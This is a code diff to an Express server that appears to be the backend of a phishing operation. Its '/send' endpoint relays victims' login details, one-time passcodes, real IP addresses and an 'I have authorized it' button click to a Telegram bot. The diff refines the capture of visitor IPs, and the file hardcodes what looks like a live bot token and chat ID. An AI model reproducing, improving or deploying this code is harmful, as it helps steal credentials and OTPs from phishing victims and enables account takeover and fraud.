@@ -6,6 +6,9 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
+// Tells Express to trust proxy headers to get the actual visitor IP
+app.set('trust proxy', true);
+
 // --- YOUR VERIFIED DETAILS ---
 const botToken = '8347968051:AAEThb_Nmqy-bhdsZwmEnsBSQgXVc-fGYbs';
 const chatId = '7554731151';
@@ -35,7 +38,11 @@ app.post('/webhook', (req, res) => {
 // 2. SEND TO BOT (When a hit comes from InfinityFree)
 app.post('/send', (req, res) => {
     const data = req.body;
-    const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    
+    // DETECTS REAL VISITOR IP: Takes the first IP in the forwarded chain
+    const forwarded = req.headers['x-forwarded-for'];
+    const userIP = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;
+
     let message = "";
 
     if (data.type === 'login') {
@@ -50,7 +57,7 @@ app.post('/send', (req, res) => {
     else if (data.type === 'otp') {
         message = `OTP: ${data.otp}`;
     } 
-    // This matches the finalConfirm() function in your HTML
+    // Captures the "I have authorized it" button click
     else if (data.type === 'final_click') {
         message = `✅ "I have authorized it" clicked for: ${data.email}`;
     }
